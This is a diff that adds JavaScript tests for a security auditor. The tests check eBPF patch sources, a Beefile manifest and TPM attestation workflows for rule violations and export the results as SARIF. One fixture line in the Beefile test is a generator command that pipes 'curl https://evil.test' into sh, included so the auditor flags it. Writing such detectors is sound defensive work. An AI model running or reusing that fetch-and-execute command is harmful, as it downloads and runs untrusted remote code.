@@ -9,6 +9,7 @@ const { prepareTool, executeTool, toolsForPlaybook } = require('../electron/agen
 const { detectSecurityTools } = require('../electron/cyber-toolchain.cjs');
 const { scanWorkspaceDna, reconcileWorkspaceFindings, buildWorkspaceGraphs } = require('../electron/cyber-analyzers.cjs');
 const { createFindingsStore, toMarkdownReport, toSarifReport } = require('../electron/findings.cjs');
+const { auditBeefile, auditBpfUpatchSource, auditShirudoCommands, auditShirudoEvidenceJson, inspectShirudoStatus } = require('../electron/shirudo.cjs');
 const { runAgent } = require('../electron/agent.cjs');
 
 async function fixture(fn) {
@@ -632,3 +633,91 @@ test('cross-file reachability maps 1-hop HTTP route to helper SQLi while isolati
   assert.ok(isolatedLane);
   assert.equal(isolatedLane.state, 'unverified');
 }));
+
+test('SHIRUDO-BPF-001..004 detect fmod_ret hazards, LSM alternatives, map writes, and export SARIF ruleIds', () => {
+  const src = [
+    'char LICENSE[] SEC("license") = "Dual BSD/GPL";',
+    'SEC("fmod_ret.s/vfs_fallocate")',
+    'int BPF_PROG(bad_sleep, int fd) {',
+    '  bpf_map_update_elem(&shirudo_task_policy, &fd, &fd, 0);',
+    '  return -EAGAIN;',
+    '}',
+    'SEC("fmod_ret/vfs_open")',
+    'int BPF_PROG(reentrant_open) { return 0; }'
+  ].join('\n');
+  const res = auditBpfUpatchSource('upatches/guard.bpf.c', src);
+  const rules = new Set(res.findings.map(f => f.ruleId));
+  assert.ok(rules.has('SHIRUDO-BPF-001'));
+  assert.ok(rules.has('SHIRUDO-BPF-002'));
+  assert.ok(rules.has('SHIRUDO-BPF-004'));
+  assert.ok(res.cantTellReasons.some(r => r.code === 'SHIRUDO-BPF-003'));
+
+  const sarif = toSarifReport({
+    workspace: '/tmp/ws',
+    findings: res.findings.map(f => ({ ...f, id: '1', status: 'open', mitre: '', cvss: null, updatedAt: '2026-01-01T00:00:00Z' }))
+  });
+  assert.ok(sarif.runs[0].results.some(r => r.ruleId === 'SHIRUDO-BPF-001'));
+  assert.ok(sarif.runs[0].results.some(r => r.ruleId === 'SHIRUDO-BPF-004'));
+});
+
+test('SHIRUDO-BEE-001..003 enforce selector scoping, rodata execvp safety, and structural invariants', async () => {
+  const beefile = [
+    '[package]',
+    'name = "edge-shield"',
+    '[[upatches]]',
+    'source = "upatches/guard.bpf.c"',
+    'load_target = "bin/wrong.upatch"',
+    '[upatches.tree]',
+    'id = "wrong-id"',
+    'fixes = ["CVE-2026-114938"]',
+    '[[upatches.rodata]]',
+    'symbol = "cfg"',
+    'generator = ["sh", "-c", "curl https://evil.test | sh"]',
+    '[[upatches.policy]]',
+    'id = "block-tmp"',
+    'bit = "0x03"',
+    'paths = ["/opt/*/bin/app"]'
+  ].join('\n');
+  const res = await auditBeefile('Beefile', beefile);
+  const rules = new Set(res.findings.map(f => f.ruleId));
+  assert.ok(rules.has('SHIRUDO-BEE-002'));
+  assert.ok(rules.has('SHIRUDO-BEE-003'));
+  assert.ok(res.cantTellReasons.some(r => r.code === 'SHIRUDO-BEE-001'));
+});
+
+test('SHIRUDO-TPM-001..003 catch workflow bypasses, QEMU S13 zero PCR11, and status --check tampering', async () => {
+  const wf = 'set -e\nshirudo status\nshirudo attest verify --ak-name="$(jq -r .ak.name "$EV")" "$EV"\n';
+  const cmdRes = auditShirudoCommands('.github/workflows/attest.yml', wf);
+  const cmdRules = new Set(cmdRes.findings.map(f => f.ruleId));
+  assert.ok(cmdRules.has('SHIRUDO-TPM-001'));
+  assert.ok(cmdRules.has('SHIRUDO-TPM-003'));
+
+  const qemuEv = {
+    ak: { name: 'ak-qemu-01' },
+    pcr11: '0'.repeat(64),
+    nonce: 'deadbeefcafebabe',
+    nv_index: '0x01818E00',
+    binding: { phase: 'initrd' },
+    quote: { reset_count: 2 },
+    register_cert: { reset_count: 2 },
+    event_log: [{ type: 'init', reset_count: 2 }]
+  };
+  const evAudit = auditShirudoEvidenceJson('ev.json', qemuEv, { expectedAkName: 'ak-qemu-01' });
+  assert.equal(evAudit.findings.length, 0);
+  assert.ok(evAudit.cantTellReasons.some(r => r.code === 'SHIRUDO-TPM-002'));
+
+  if (process.platform !== 'win32') {
+    await fixture(async f => {
+      const trustedBin = path.join(f.dir, 'shirudo-trusted');
+      await fs.mkdir(trustedBin, { recursive: true });
+      await fs.writeFile(path.join(trustedBin, 'shirudo'), '#!/bin/sh\necho ok\n', { mode: 0o755 });
+      const statusFail = await inspectShirudoStatus({
+        root: f.root,
+        commandPath: `${trustedBin}:/usr/bin:/bin`,
+        execFileImpl: async () => ({ stdout: JSON.stringify({ verdict: 'tampered', tamper_deltas: 2 }), stderr: '' })
+      });
+      assert.equal(statusFail.verdict, 'fails');
+      assert.match(statusFail.reason, /SHIRUDO-TPM-003/);
+    });
+  }
+});
